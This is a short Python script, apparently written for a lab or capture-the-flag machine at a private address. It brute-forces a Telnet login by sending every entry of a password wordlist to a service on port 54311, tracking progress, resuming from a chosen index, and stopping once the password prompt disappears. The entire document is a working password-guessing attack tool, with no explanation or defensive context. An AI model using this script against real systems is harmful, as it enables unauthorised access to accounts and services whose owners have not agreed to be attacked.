#!/usr/bin/env python
# encoding: utf-8

import socket
import sys
from telnetlib import Telnet

#WORDLIST = '/usr/share/dict/top500passwords-2008'
#WORDLIST = '/usr/share/dict/password-2011'
WORDLIST = '/usr/share/dict/cracklib-small'
#WORDLIST = '/usr/share/dict/words-insane'
TARGET = ('192.168.56.101', 54311)

#s = socket.create_connection(TARGET)

tn = Telnet(*TARGET)
print(tn.read_until(b'in\n').decode())

with open(WORDLIST) as fp:
    total_pwds = sum(1 for line in fp)

start = 0
try:
    start = int(sys.argv[1])
except:
    pass

with open(WORDLIST) as fp:
    tn.read_until(b':').decode()
    for i, pwd in enumerate(fp):
        if i < start:
            continue
        sys.stderr.write("\r{: 3.1%} {: 6}/{}: {}                    ".format(i/total_pwds, i, total_pwds, pwd[:-1]))
        tn.write(pwd.encode())
        data = tn.read_until(b':').decode()
        if 'Password:' not in data:
            print()
            print(data, repr(pwd))
            break
